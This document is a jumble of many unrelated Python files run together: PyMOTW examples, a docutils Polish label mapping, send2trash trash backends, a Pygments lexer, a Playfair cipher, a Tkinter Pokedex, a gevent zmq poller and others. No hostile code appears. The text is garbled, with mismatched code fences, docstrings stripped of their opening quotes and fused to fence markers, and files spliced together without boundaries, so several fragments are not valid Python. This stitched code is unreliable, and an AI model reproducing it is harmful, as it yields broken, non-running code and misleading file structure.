#end_pymotw_header
import nested

import nested.shallow
print('nested.shallow:', nested.shallow.__file__)
nested.shallow.func()

print()
import nested.second.deep
print('nested.second.deep:', nested.second.deep.__file__)
nested.second.deep.func()

```









---


```py


#end_pymotw_header
import demopkg1
print('demopkg1:', demopkg1.__file__)

import demopkg1.shared
print('demopkg1.shared:', demopkg1.shared.__file__)

import demopkg1.not_shared
print('demopkg1.not_shared:', demopkg1.not_shared.__file__)

# $Id$
# Author: Robert Wojciechowicz <rw@smsnet.pl>
# Copyright: This module has been placed in the public domain.

# New language mappings are welcome.  Before doing a new translation, please
# read <http://docutils.sf.net/docs/howto/i18n.html>.  Two files must be
# translated for each language: one in docutils/languages, the other in
# docutils/parsers/rst/languages.
````

````py
Polish-language mappings for language-dependent features of Docutils.```


```py

__docformat__ = 'reStructuredText'

labels = {
      # fixed: language-dependent
      'author': u'Autor',
      'authors': u'Autorzy',
      'organization': u'Organizacja',
      'address': u'Adres',
      'contact': u'Kontakt',
      'version': u'Wersja',
      'revision': u'Korekta',
      'status': u'Status',
      'date': u'Data',
      'copyright': u'Copyright',
      'dedication': u'Dedykacja',
      'abstract': u'Streszczenie',
      'attention': u'Uwaga!',
      'caution': u'Ostro\u017cnie!',
      'danger': u'!Niebezpiecze\u0144stwo!',
      'error': u'B\u0142\u0105d',
      'hint': u'Wskaz\u00f3wka',
      'important': u'Wa\u017cne',
      'note': u'Przypis',
      'tip': u'Rada',
      'warning': u'Ostrze\u017cenie',
      'contents': u'Tre\u015b\u0107'}```


```pyMapping of node class name to label text."""

bibliographic_fields = {
      # language-dependent: fixed
      u'autor': 'author',
      u'autorzy': 'authors',
      u'organizacja': 'organization',
      u'adres': 'address',
      u'kontakt': 'contact',
      u'wersja': 'version',
      u'korekta': 'revision',
      u'status': 'status',
      u'data': 'date',
      u'copyright': 'copyright',
      u'dedykacja': 'dedication',
      u'streszczenie': 'abstract'}```


```pyPolish (lowcased) to canonical name mapping for bibliographic fields."""

author_separators = [';', ',']```


```pyList of separator strings for the 'Authors' bibliographic field. Tried in
order."""



# Copyright 2017 Virgil Dupras

# This software is licensed under the "BSD" License as described in the "LICENSE" file,
# which should be included with this package. The terms are also available at
# http://www.hardcoded.net/licenses/bsd_license

from gi.repository import GObject, Gio
from .exceptions import TrashPermissionError
from .util import preprocess_paths


def send2trash(paths):
    paths = preprocess_paths(paths)
    for path in paths:
        try:
            f = Gio.File.new_for_path(path)
            f.trash(cancellable=None)
        except GObject.GError as e:
            if e.code == Gio.IOErrorEnum.NOT_SUPPORTED:
                # We get here if we can't create a trash directory on the same
                # device. I don't know if other errors can result in NOT_SUPPORTED.
                raise TrashPermissionError("")
            raise OSError(e.message)

# Copyright 2017 Virgil Dupras

# This software is licensed under the "BSD" License as described in the "LICENSE" file,
# which should be included with this package. The terms are also available at
# http://www.hardcoded.net/licenses/bsd_license

from platform import mac_ver
from sys import version_info

# NOTE: version of pyobjc only supports python >= 3.6 and 10.9+
macos_ver = tuple(int(part) for part in mac_ver()[0].split("."))
if version_info >= (3, 6) and macos_ver >= (10, 9):
    try:
        from .plat_osx_pyobjc import send2trash
    except ImportError:
        # Try to fall back to ctypes version, although likely problematic still
        from .plat_osx_ctypes import send2trash
else:
    # Just use the old version otherwise
    from .plat_osx_ctypes import send2trash  # noqa: F401

# Copyright 2017 Virgil Dupras

# This software is licensed under the "BSD" License as described in the "LICENSE" file,
# which should be included with this package. The terms are also available at
# http://www.hardcoded.net/licenses/bsd_license

from __future__ import unicode_literals

from ctypes import cdll, byref, Structure, c_char, c_char_p
from ctypes.util import find_library

from .compat import binary_type
from .util import preprocess_paths

Foundation = cdll.LoadLibrary(find_library("Foundation"))
CoreServices = cdll.LoadLibrary(find_library("CoreServices"))

GetMacOSStatusCommentString = Foundation.GetMacOSStatusCommentString
GetMacOSStatusCommentString.restype = c_char_p
FSPathMakeRefWithOptions = CoreServices.FSPathMakeRefWithOptions
FSMoveObjectToTrashSync = CoreServices.FSMoveObjectToTrashSync

kFSPathMakeRefDefaultOptions = 0
kFSPathMakeRefDoNotFollowLeafSymlink = 0x01

kFSFileOperationDefaultOptions = 0
kFSFileOperationOverwrite = 0x01
kFSFileOperationSkipSourcePermissionErrors = 0x02
kFSFileOperationDoNotMoveAcrossVolumes = 0x04
kFSFileOperationSkipPreflight = 0x08


class FSRef(Structure):
    _fields_ = [("hidden", c_char * 80)]


def check_op_result(op_result):
    if op_result:
        msg = GetMacOSStatusCommentString(op_result).decode("utf-8")
        raise OSError(msg)


def send2trash(paths):
    paths = preprocess_paths(paths)
    paths = [
        path.encode("utf-8") if not isinstance(path, binary_type) else path
        for path in paths
    ]
    for path in paths:
        fp = FSRef()
        opts = kFSPathMakeRefDoNotFollowLeafSymlink
        op_result = FSPathMakeRefWithOptions(path, opts, byref(fp), None)
        check_op_result(op_result)
        opts = kFSFileOperationDefaultOptions
        op_result = FSMoveObjectToTrashSync(byref(fp), None, opts)
        check_op_result(op_result)

# Copyright 2017 Virgil Dupras

# This software is licensed under the "BSD" License as described in the "LICENSE" file,
# which should be included with this package. The terms are also available at
# http://www.hardcoded.net/licenses/bsd_license

from Foundation import NSFileManager, NSURL
from .compat import text_type
from .util import preprocess_paths


def check_op_result(op_result):
    # First value will be false on failure
    if not op_result[0]:
        # Error is in third value, localized failure reason matchs ctypes version
        raise OSError(op_result[2].localizedFailureReason())


def send2trash(paths):
    paths = preprocess_paths(paths)
    paths = [
        path.decode("utf-8") if not isinstance(path, text_type) else path
        for path in paths
    ]
    for path in paths:
        file_url = NSURL.fileURLWithPath_(path)
        fm = NSFileManager.defaultManager()
        op_result = fm.trashItemAtURL_resultingItemURL_error_(file_url, None, None)
        check_op_result(op_result)

# Copyright 2017 Virgil Dupras

# This software is licensed under the "BSD" License as described in the "LICENSE" file,
# which should be included with this package. The terms are also available at
# http://www.hardcoded.net/licenses/bsd_license

from __future__ import unicode_literals
from platform import version

# if windows is vista or newer and pywin32 is available use IFileOperation
if int(version().split(".", 1)[0]) >= 6:
    try:
        # Attempt to use pywin32 to use IFileOperation
        from .plat_win_modern import send2trash
    except ImportError:
        # use SHFileOperation as fallback
        from .plat_win_legacy import send2trash
else:
    # use SHFileOperation as fallback
    from .plat_win_legacy import send2trash  # noqa: F401

# Copyright 2017 Virgil Dupras

# This software is licensed under the "BSD" License as described in the "LICENSE" file,
# which should be included with this package. The terms are also available at
# http://www.hardcoded.net/licenses/bsd_license

from __future__ import unicode_literals
import os.path as op
from .compat import text_type
from .util import preprocess_paths
from platform import version
import pythoncom
import pywintypes
from win32com.shell import shell, shellcon
from .IFileOperationProgressSink import CreateSink


def send2trash(paths):
    paths = preprocess_paths(paths)
    # convert data type
    paths = [
        text_type(path, "mbcs") if not isinstance(path, text_type) else path
        for path in paths
    ]
    # convert to full paths
    paths = [op.abspath(path) if not op.isabs(path) else path for path in paths]
    # remove the leading \\?\ if present
    paths = [path[4:] if path.startswith("\\\\?\\") else path for path in paths]
    # Need to initialize the com before using
    pythoncom.CoInitialize()
    # create instance of file operation object
    fileop = pythoncom.CoCreateInstance(
        shell.CLSID_FileOperation, None, pythoncom.CLSCTX_ALL, shell.IID_IFileOperation,
    )
    # default flags to use
    flags = (
        shellcon.FOF_NOCONFIRMATION
        | shellcon.FOF_NOERRORUI
        | shellcon.FOF_SILENT
        | shellcon.FOFX_EARLYFAILURE
    )
    # determine rest of the flags based on OS version
    # use newer recommended flags if available
    if int(version().split(".", 1)[0]) >= 8:
        flags |= (
            0x20000000  # FOFX_ADDUNDORECORD win 8+
            | 0x00080000  # FOFX_RECYCLEONDELETE win 8+
        )
    else:
        flags |= shellcon.FOF_ALLOWUNDO
    # set the flags
    fileop.SetOperationFlags(flags)
    # actually try to perform the operation, this section may throw a
    # pywintypes.com_error which does not seem to create as nice of an
    # error as OSError so wrapping with try to convert
    sink = CreateSink()
    try:
        for path in paths:
            item = shell.SHCreateItemFromParsingName(path, None, shell.IID_IShellItem)
            fileop.DeleteItem(item, sink)
        result = fileop.PerformOperations()
        aborted = fileop.GetAnyOperationsAborted()
        # if non-zero result or aborted throw an exception
        if result or aborted:
            raise OSError(None, None, paths, result)
    except pywintypes.com_error as error:
        # convert to standard OS error, allows other code to get a
        # normal errno
        raise OSError(None, error.strerror, path, error.hresult)
    finally:
        # Need to make sure we call this once fore every init
        pythoncom.CoUninitialize()
````

````py Platform-dependent objects """

import sys


PYTHON_VERSION = float(sys.version_info[0]) + float(sys.version_info[1]) / 10


if PYTHON_VERSION < 3:
    _str_type = basestring  # noqa: F821
    _int_types = (int, long)  # noqa: F821
else:
    _str_type = str
    _int_types = (int,)


if PYTHON_VERSION < 3.3:
    from collections import (  # noqa: F401
        Callable,
        Container,
        Hashable,
        Iterable,
        Mapping,
        MutableMapping,
        Sequence,
        Set,
        Sized,
    )
else:
    from collections.abc import (  # noqa: F401
        Callable,
        Container,
        Hashable,
        Iterable,
        Mapping,
        MutableMapping,
        Sequence,
        Set,
        Sized,
    )

```









---


```py



#end_pymotw_header
import platform

print('interpreter:', platform.architecture())
print('/bin/ls    :', platform.architecture('/bin/ls'))

# -*- coding: utf-8
from __future__ import unicode_literals

import platform as pf

from .metrics_core import GaugeMetricFamily
from .registry import REGISTRY


class PlatformCollector(object):
    """Collector for python platform information"""

    def __init__(self, registry=REGISTRY, platform=None):
        self._platform = pf if platform is None else platform
        info = self._info()
        system = self._platform.system()
        if system == "Java":
            info.update(self._java())
        self._metrics = [
            self._add_metric("python_info", "Python platform information", info)
        ]
        if registry:
            registry.register(self)

    def collect(self):
        return self._metrics

    @staticmethod
    def _add_metric(name, documentation, data):
        labels = data.keys()
        values = [data[k] for k in labels]
        g = GaugeMetricFamily(name, documentation, labels=labels)
        g.add_metric(values, 1)
        return g

    def _info(self):
        major, minor, patchlevel = self._platform.python_version_tuple()
        return {
            "version": self._platform.python_version(),
            "implementation": self._platform.python_implementation(),
            "major": major,
            "minor": minor,
            "patchlevel": patchlevel
        }

    def _java(self):
        java_version, _, vminfo, osinfo = self._platform.java_ver()
        vm_name, vm_release, vm_vendor = vminfo
        return {
            "jvm_version": java_version,
            "jvm_release": vm_release,
            "jvm_vendor": vm_vendor,
            "jvm_name": vm_name
        }


PLATFORM_COLLECTOR = PlatformCollector()```


```pyPlatformCollector in default Registry REGISTRY"""

```









---


```py



#end_pymotw_header
import platform

print('uname:', platform.uname())

print()
print('system   :', platform.system())
print('node     :', platform.node())
print('release  :', platform.release())
print('version  :', platform.version())
print('machine  :', platform.machine())
print('processor:', platform.processor())

```









---


```py



#end_pymotw_header
import platform

print('Normal :', platform.platform())
print('Aliased:', platform.platform(aliased=True))
print('Terse  :', platform.platform(terse=True))

```









---


```py



#end_pymotw_header
import platform

print('Version      :', platform.python_version())
print('Version tuple:', platform.python_version_tuple())
print('Compiler     :', platform.python_compiler())
print('Build        :', platform.python_build())

# lets make a Player class

class Player:
    def __init__(self, name, starting_room):
        self.name = name
        self.current_room = starting_room


import string
import itertools

def chunker(seq, size):
    it = iter(seq)
    while True:
       chunk = tuple(itertools.islice(it, size))
       if not chunk:
           return
       yield chunk



def prepare_input(dirty):
    """
    Prepare the plaintext by up-casing it
    and separating repeated letters with X's
    """

    dirty = ''.join([c.upper() for c in dirty if c in string.ascii_letters])
    clean = ""

    if len(dirty) < 2:
        return dirty

    for i in range(len(dirty)-1):
        clean += dirty[i]

        if dirty[i] == dirty[i+1]:
            clean += 'X'

    clean += dirty[-1]

    if len(clean) & 1:
        clean += 'X'

    return clean

def generate_table(key):

    # I and J are used interchangeably to allow
    # us to use a 5x5 table (25 letters)
    alphabet = "ABCDEFGHIKLMNOPQRSTUVWXYZ"
    # we're using a list instead of a '2d' array because it makes the math
    # for setting up the table and doing the actual encoding/decoding simpler
    table = []

    # copy key chars into the table if they are in `alphabet` ignoring duplicates
    for char in key.upper():
        if char not in table and char in alphabet:
            table.append(char)

    # fill the rest of the table in with the remaining alphabet chars
    for char in alphabet:
        if char not in table:
            table.append(char)

    return table

def encode(plaintext, key):
    table = generate_table(key)
    plaintext = prepare_input(plaintext)
    ciphertext = ""

    # https://en.wikipedia.org/wiki/Playfair_cipher#Description
    for char1, char2 in chunker(plaintext, 2):
        row1, col1 = divmod(table.index(char1), 5)
        row2, col2 = divmod(table.index(char2), 5)

        if row1 == row2:
            ciphertext += table[row1*5+(col1+1)%5]
            ciphertext += table[row2*5+(col2+1)%5]
        elif col1 == col2:
            ciphertext += table[((row1+1)%5)*5+col1]
            ciphertext += table[((row2+1)%5)*5+col2]
        else: # rectangle
            ciphertext += table[row1*5+col2]
            ciphertext += table[row2*5+col1]

    return ciphertext


def decode(ciphertext, key):
    table = generate_table(key)
    plaintext = ""

    # https://en.wikipedia.org/wiki/Playfair_cipher#Description
    for char1, char2 in chunker(ciphertext, 2):
        row1, col1 = divmod(table.index(char1), 5)
        row2, col2 = divmod(table.index(char2), 5)

        if row1 == row2:
            plaintext += table[row1*5+(col1-1)%5]
            plaintext += table[row2*5+(col2-1)%5]
        elif col1 == col2:
            plaintext += table[((row1-1)%5)*5+col1]
            plaintext += table[((row2-1)%5)*5+col2]
        else: # rectangle
            plaintext += table[row1*5+col2]
            plaintext += table[row2*5+col1]

    return plaintext

# Data structures
# 1. Dictionaries
# 2. Lists / arrays [1,1,7,11]
# 3. Sets

# Lists
lst = [1, 1, 11, 7]
print(lst)
lst.append(2)
print(lst)
lst.remove(11)
print(lst)
lst.sort()
print(lst)

# Sets:
st = {1, 1, 11, 7}
st.add(1)
st.add(1)
st.add(11)
print(st)

# Dictionaries
d = {
    "bob": 0,
    "sarah": 0,
    "defeated_by": {"paper", "wolf"},
    "defeats": {"scissors", "sponge"},
}

print(d["bob"])
d["bob"] += 1
print(d["bob"])
print(d)
d["michael"] = 7
print(d)
print(f"You are defeated by {d['defeated_by']}")
print(d.get("other", 42))

# library
import matplotlib.pyplot as plt
from palettable.colorbrewer.qualitative import Pastel1_7

# create data
names = "groupA", "groupB", "groupC", "groupD"
size = [12, 11, 3, 30]

# Create a circle for the center of the plot
my_circle = plt.Circle((0, 0), 0.7, color="white")
plt.pie(size, labels=names, colors=["red", "green", "blue", "skyblue"])
p = plt.gcf()
p.gca().add_artist(my_circle)
plt.show()

# Custom colors --> colors will cycle
plt.pie(size, labels=names, colors=["red", "green"])
p = plt.gcf()
p.gca().add_artist(my_circle)
plt.show()


plt.pie(size, labels=names, colors=Pastel1_7.hex_colors)
p = plt.gcf()
p.gca().add_artist(my_circle)
plt.show()
````

````py
    pygments.plugin
    ~~~~~~~~~~~~~~~

    Pygments setuptools plugin interface. The methods defined
    here also work if setuptools isn't installed but they just
    return nothing.

    lexer plugins::

        [pygments.lexers]
        yourlexer = yourmodule:YourLexer

    formatter plugins::

        [pygments.formatters]
        yourformatter = yourformatter:YourFormatter
        /.ext = yourformatter:YourFormatter

    As you can see, you can define extensions for the formatter
    with a leading slash.

    syntax plugins::

        [pygments.styles]
        yourstyle = yourstyle:YourStyle

    filter plugin::

        [pygments.filter]
        yourfilter = yourfilter:YourFilter


    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py
LEXER_ENTRY_POINT = 'pygments.lexers'
FORMATTER_ENTRY_POINT = 'pygments.formatters'
STYLE_ENTRY_POINT = 'pygments.styles'
FILTER_ENTRY_POINT = 'pygments.filters'


def iter_entry_points(group_name):
    try:
        import pkg_resources
    except (ImportError, OSError):
        return []

    return pkg_resources.iter_entry_points(group_name)


def find_plugin_lexers():
    for entrypoint in iter_entry_points(LEXER_ENTRY_POINT):
        yield entrypoint.load()


def find_plugin_formatters():
    for entrypoint in iter_entry_points(FORMATTER_ENTRY_POINT):
        yield entrypoint.name, entrypoint.load()


def find_plugin_styles():
    for entrypoint in iter_entry_points(STYLE_ENTRY_POINT):
        yield entrypoint.name, entrypoint.load()


def find_plugin_filters():
    for entrypoint in iter_entry_points(FILTER_ENTRY_POINT):
        yield entrypoint.name, entrypoint.load()
````

````py
    sphinx.util.png
    ~~~~~~~~~~~~~~~

    PNG image manipulation helpers.

    :copyright: Copyright 2007-2021 by the Sphinx team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

import binascii
import struct
from typing import Optional

LEN_IEND = 12
LEN_DEPTH = 22

DEPTH_CHUNK_LEN = struct.pack('!i', 10)
DEPTH_CHUNK_START = b'tEXtDepth\x00'
IEND_CHUNK = b'\x00\x00\x00\x00IEND\xAE\x42\x60\x82'


def read_png_depth(filename: str) -> Optional[int]:
    """Read the special tEXt chunk indicating the depth from a PNG file."""
    with open(filename, 'rb') as f:
        f.seek(- (LEN_IEND + LEN_DEPTH), 2)
        depthchunk = f.read(LEN_DEPTH)
        if not depthchunk.startswith(DEPTH_CHUNK_LEN + DEPTH_CHUNK_START):
            # either not a PNG file or not containing the depth chunk
            return None
        else:
            return struct.unpack('!i', depthchunk[14:18])[0]


def write_png_depth(filename: str, depth: int) -> None:
    """Write the special tEXt chunk indicating the depth to a PNG file.

    The chunk is placed immediately before the special IEND chunk.
    """
    data = struct.pack('!i', depth)
    with open(filename, 'r+b') as f:
        # seek to the beginning of the IEND chunk
        f.seek(-LEN_IEND, 2)
        # overwrite it with the depth chunk
        f.write(DEPTH_CHUNK_LEN + DEPTH_CHUNK_START + data)
        # calculate the checksum over chunk name and data
        crc = binascii.crc32(DEPTH_CHUNK_START + data) & 0xffffffff
        f.write(struct.pack('!I', crc))
        # replace the IEND chunk
        f.write(IEND_CHUNK)

# first install poetpy library using pip install poetpy then import it
# using random to select a random poem
import poetpy
import random

try:
    print('Poem of which author you want to listen?')
    # taking the author name as input
    auth = input()

    # using the get_poetry() function to get poems
    poem = poetpy.get_poetry('author', auth, 'title,linecount')
    poems = poetpy.get_poetry('author', auth, 'lines')

    poem_len = len(poem)

    # selecting a random poem from the list of poems
    poem_no = random.randint(1, poem_len)

    # printing the different values realted to poem
    print("Title- ", poem[poem_no]['title'])
    print("No. of lines-", poem[poem_no]['linecount'])

    # print the peom
    poem_str = '\n'
    print("Poem-\n", poem_str.join(poems[poem_no]['lines']))

except Exception as e:
    pass
````

````py
    pygments.lexers.pointless
    ~~~~~~~~~~~~~~~~~~~~~~~~~

    Lexers for Pointless.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.lexer import RegexLexer, words
from pygments.token import Comment, Error, Keyword, Name, Number, Operator, \
    Punctuation, String, Text

__all__ = ['PointlessLexer']


class PointlessLexer(RegexLexer):
    """
    For `Pointless <https://ptls.dev>`_ source code.

    .. versionadded:: 2.7
    """

    name = 'Pointless'
    aliases = ['pointless']
    filenames = ['*.ptls']

    ops = words([
        "+", "-", "*", "/", "**", "%", "+=", "-=", "*=",
        "/=", "**=", "%=", "|>", "=", "==", "!=", "<", ">",
        "<=", ">=", "=>", "$", "++",
    ])

    keywords = words([
        "if", "then", "else", "where", "with", "cond",
        "case", "and", "or", "not", "in", "as", "for",
        "requires", "throw", "try", "catch", "when",
        "yield", "upval",
    ], suffix=r'\b')

    tokens = {
        'root': [
            (r'[ \n\r]+', Text),
            (r'--.*$', Comment.Single),
            (r'"""', String, 'multiString'),
            (r'"', String, 'string'),
            (r'[\[\](){}:;,.]', Punctuation),
            (ops, Operator),
            (keywords, Keyword),
            (r'\d+|\d*\.\d+', Number),
            (r'(true|false)\b', Name.Builtin),
            (r'[A-Z][a-zA-Z0-9]*\b', String.Symbol),
            (r'output\b', Name.Variable.Magic),
            (r'(export|import)\b', Keyword.Namespace),
            (r'[a-z][a-zA-Z0-9]*\b', Name.Variable)
        ],
        'multiString': [
            (r'\\.', String.Escape),
            (r'"""', String, '#pop'),
            (r'"', String),
            (r'[^\\"]+', String),
        ],
        'string': [
            (r'\\.', String.Escape),
            (r'"', String, '#pop'),
            (r'\n', Error),
            (r'[^\\"]+', String),
        ],
    }

import pypokedex
import PIL.Image,PIL.ImageTk
import tkinter as tk
import urllib3
from io import BytesIO

#building the gui
window=tk.Tk()
window.geometry("600x500")
window.title("Pokedex- A big pokemon fan")
window.config(padx=10, pady=10)

pokemon_image=tk.Label(window)
pokemon_image.pack(padx=10, pady=10)
#setting the title
title_label=tk.Label(window,text="Pokedex")
title_label.config(font=("Arial",28))
title_label.pack(padx=10,pady =10)

pokemon_information=tk.Label(window)
pokemon_information.config(font=("Arial",20))
pokemon_information.pack(padx=10,pady =10)

pokemon_types=tk.Label(window)
pokemon_types.config(font=("Arial",20))
pokemon_types.pack(padx=10,pady =10)



#function to load image and information of pokemon
def load_pokemon():
    #matching id and name
    pokemon=pypokedex.get(name=text_id_name.get(1.0,"end-1c"))
    http = urllib3.PoolManager()
    #getting the image
    response= http.request('GET',pokemon.sprites.front.get('default'))
    image=PIL.Image.open(BytesIO(response.data))
     #saving the image on GUI
    img=PIL.ImageTk.PhotoImage(image)
    pokemon_image.config(image=img)
    pokemon_image.image=img
     #saving the type /characteristic of character
    pokemon_information.config(text=f"{ pokemon.dex}- {pokemon.name}".title())
    pokemon_types.config(text=" - ".join([t for t in pokemon.types]).title())

#applying the proper location
label_id_name=tk.Label(window,text="ID Or Name")
label_id_name.config(font=("Arial",20))
label_id_name.pack(padx=10,pady =10)

text_id_name=tk.Text(window,height=1)
text_id_name.config(font=("Arial",20))
text_id_name.pack(padx=10,pady =10)


btn_load=tk.Button(window, text="Load Pokemon",command=load_pokemon)
btn_load.config(font=("Arial",20))
btn_load.pack(padx=10,pady =10)

window.mainloop()
import zmq
import gevent
from gevent import select

from zmq import Poller as _original_Poller


class _Poller(_original_Poller):
    """Replacement for :class:`zmq.Poller`

    Ensures that the greened Poller below is used in calls to
    :meth:`zmq.Poller.poll`.
    """

    _gevent_bug_timeout = 1.33  # minimum poll interval, for working around gevent bug

    def _get_descriptors(self):
        """Returns three elements tuple with socket descriptors ready
        for gevent.select.select
        """
        rlist = []
        wlist = []
        xlist = []

        for socket, flags in self.sockets:
            if isinstance(socket, zmq.Socket):
                rlist.append(socket.getsockopt(zmq.FD))
                continue
            elif isinstance(socket, int):
                fd = socket
            elif hasattr(socket, 'fileno'):
                try:
                    fd = int(socket.fileno())
                except:
                    raise ValueError('fileno() must return an valid integer fd')
            else:
                raise TypeError(
                    'Socket must be a 0MQ socket, an integer fd '
                    'or have a fileno() method: %r' % socket
                )

            if flags & zmq.POLLIN:
                rlist.append(fd)
            if flags & zmq.POLLOUT:
                wlist.append(fd)
            if flags & zmq.POLLERR:
                xlist.append(fd)

        return (rlist, wlist, xlist)

    def poll(self, timeout=-1):
        """Overridden method to ensure that the green version of
        Poller is used.

        Behaves the same as :meth:`zmq.core.Poller.poll`
        """

        if timeout is None:
            timeout = -1

        if timeout < 0:
            timeout = -1

        rlist = None
        wlist = None
        xlist = None

        if timeout > 0:
            tout = gevent.Timeout.start_new(timeout / 1000.0)
        else:
            tout = None

        try:
            # Loop until timeout or events available
            rlist, wlist, xlist = self._get_descriptors()
            while True:
                events = super(_Poller, self).poll(0)
                if events or timeout == 0:
                    return events

                # wait for activity on sockets in a green way
                # set a minimum poll frequency,
                # because gevent < 1.0 cannot be trusted to catch edge-triggered FD events
                _bug_timeout = gevent.Timeout.start_new(self._gevent_bug_timeout)
                try:
                    select.select(rlist, wlist, xlist)
                except gevent.Timeout as t:
                    if t is not _bug_timeout:
                        raise
                finally:
                    _bug_timeout.cancel()

        except gevent.Timeout as t:
            if t is not tout:
                raise
            return []
        finally:
            if timeout > 0:
                tout.cancel()

import pandas as pd
from matplotlib import pyplot as plt
from sklearn.linear_model import LinearRegression

# Splitting the dataset into the Training set and Test set
from sklearn.model_selection import train_test_split

# Fitting Polynomial Regression to the dataset
from sklearn.preprocessing import PolynomialFeatures

# Importing the dataset
dataset = pd.read_csv(
    "https://s3.us-west-2.amazonaws.com/public.gamelab.fun/dataset/"
    "position_salaries.csv"
)
X = dataset.iloc[:, 1:2].values
y = dataset.iloc[:, 2].values


X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=0)


poly_reg = PolynomialFeatures(degree=4)
X_poly = poly_reg.fit_transform(X)
pol_reg = LinearRegression()
pol_reg.fit(X_poly, y)


# Visualizing the Polymonial Regression results
def viz_polymonial():
    plt.scatter(X, y, color="red")
    plt.plot(X, pol_reg.predict(poly_reg.fit_transform(X)), color="blue")
    plt.title("Truth or Bluff (Linear Regression)")
    plt.xlabel("Position level")
    plt.ylabel("Salary")
    plt.show()
    return


if __name__ == "__main__":
    viz_polymonial()

    # Predicting a new result with Polymonial Regression
    pol_reg.predict(poly_reg.fit_transform([[5.5]]))
    # output should be 132148.43750003

from typing import Sequence


def evaluate_poly(poly: Sequence[float], x: float) -> float:
    """Evaluate a polynomial f(x) at specified point x and return the value.

    Arguments:
    poly -- the coefficients of a polynomial as an iterable in order of
            ascending degree
    x -- the point at which to evaluate the polynomial

    >>> evaluate_poly((0.0, 0.0, 5.0, 9.3, 7.0), 10.0)
    79800.0
    """
    return sum(c * (x ** i) for i, c in enumerate(poly))


def horner(poly: Sequence[float], x: float) -> float:
    """Evaluate a polynomial at specified point using Horner's method.

    In terms of computational complexity, Horner's method is an efficient method
    of evaluating a polynomial. It avoids the use of expensive exponentiation,
    and instead uses only multiplication and addition to evaluate the polynomial
    in O(n), where n is the degree of the polynomial.

    https://en.wikipedia.org/wiki/Horner's_method

    Arguments:
    poly -- the coefficients of a polynomial as an iterable in order of
            ascending degree
    x -- the point at which to evaluate the polynomial

    >>> horner((0.0, 0.0, 5.0, 9.3, 7.0), 10.0)
    79800.0
    """
    result = 0.0
    for coeff in reversed(poly):
        result = result * x + coeff
    return result


if __name__ == "__main__":
    """
    Example:
    >>> poly = (0.0, 0.0, 5.0, 9.3, 7.0)  # f(x) = 7.0x^4 + 9.3x^3 + 5.0x^2
    >>> x = -13.0
    >>> # f(-13) = 7.0(-13)^4 + 9.3(-13)^3 + 5.0(-13)^2 = 180339.9
    >>> print(evaluate_poly(poly, x))
    180339.9
    """
    poly = (0.0, 0.0, 5.0, 9.3, 7.0)
    x = 10.0
    print(evaluate_poly(poly, x))
    print(horner(poly, x))

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from multiprocessing import Pool
import os, time, random


def long_time_task(name):
    print("Run task %s (%s)..." % (name, os.getpid()))
    start = time.time()
    time.sleep(random.random() * 3)
    end = time.time()
    print("Task %s runs %0.2f seconds." % (name, (end - start)))


if __name__ == "__main__":
    print("Parent process %s." % os.getpid())
    p = Pool(4)
    for i in range(5):
        p.apply_async(long_time_task, args=(i,))
    print("Waiting for all subprocesses done...")
    p.close()
    p.join()
    print("All subprocesses done.")
````

````py
Populating Next Right Pointers in Each Node

You are given a perfect binary tree where all leaves are on the same level, and every parent has two children.
The binary tree has the following definition:
struct Node {
  int val;
  Node *left;
  Node *right;
  Node *next;
}
Populate each next pointer to point to its next right node.
If there is no next right node, the next pointer should be set to NULL.
Initially, all next pointers are set to NULL.

=========================================
Breadth first (level order) traversal, using queue.
Save the previous node and level and if the current level is same
then make the previous node to point to the current node.
    Time Complexity:    O(N)
    Space Complexity:   O(N)```


```py


############
# Solution #
############

from collections import deque

# Definition for a Node.
class Node:
    def __init__(self, val, left, right, next):
        self.val = val
        self.left = left
        self.right = right
        self.next = next


def populating_next_pointers_tree(root):
    previous = None
    queue = deque()
    queue.append((root, 0))

    while queue:
        el = queue.popleft()
        node = el[0]
        lvl = el[1]

        if node is None:
            continue

        if (previous is not None) and (lvl == previous[1]):
            previous[0].next = node

        previous = (node, lvl)

        lvl += 1
        queue.append((node.left, lvl))
        queue.append((node.right, lvl))

    return root

import collections
import os
import shlex
import subprocess
import sys

from ._consts import SHELL_NAMES


Process = collections.namedtuple('Process', 'args pid ppid')


def _get_process_mapping():
    """Try to look up the process tree via the output of `ps`.
    """
    output = subprocess.check_output([
        'ps', '-ww', '-o', 'pid=', '-o', 'ppid=', '-o', 'args=',
    ])
    if not isinstance(output, str):
        output = output.decode(sys.stdout.encoding)
    processes = {}
    for line in output.split('\n'):
        try:
            pid, ppid, args = line.strip().split(None, 2)
        except ValueError:
            continue
        processes[pid] = Process(
            args=tuple(shlex.split(args)), pid=pid, ppid=ppid,
        )
    return processes


def get_shell(pid=None, max_depth=6):
    """Get the shell that the supplied pid or os.getpid() is running in.
    """
    pid = str(pid or os.getpid())
    mapping = _get_process_mapping()
    login_shell = os.environ.get('SHELL', '')
    for _ in range(max_depth):
        try:
            proc = mapping[pid]
        except KeyError:
            break
        name = os.path.basename(proc.args[0]).lower()
        if name in SHELL_NAMES:
            return (name, proc.args[0])
        elif proc.args[0].startswith('-'):
            # This is the login shell. Use the SHELL environ if possible
            # because it provides better information.
            if login_shell:
                name = login_shell.lower()
            else:
                name = proc.args[0][1:].lower()
            return (os.path.basename(name), name)
        pid = proc.ppid     # Go up one level.
    return None

import os
from typing import ContextManager, TextIO, cast

from ..utils import DummyContext
from .base import PipeInput
from .vt100 import Vt100Input

__all__ = [
    "PosixPipeInput",
]


class PosixPipeInput(Vt100Input, PipeInput):
    """
    Input that is send through a pipe.
    This is useful if we want to send the input programmatically into the
    application. Mostly useful for unit testing.

    Usage::

        input = PosixPipeInput()
        input.send_text('inputdata')
    """

    _id = 0

    def __init__(self, text: str = "") -> None:
        self._r, self._w = os.pipe()

        class Stdin:
            encoding = "utf-8"

            def isatty(stdin) -> bool:
                return True

            def fileno(stdin) -> int:
                return self._r

        super().__init__(cast(TextIO, Stdin()))
        self.send_text(text)

        # Identifier for every PipeInput for the hash.
        self.__class__._id += 1
        self._id = self.__class__._id

    def send_bytes(self, data: bytes) -> None:
        os.write(self._w, data)

    def send_text(self, data: str) -> None:
        "Send text to the input."
        os.write(self._w, data.encode("utf-8"))

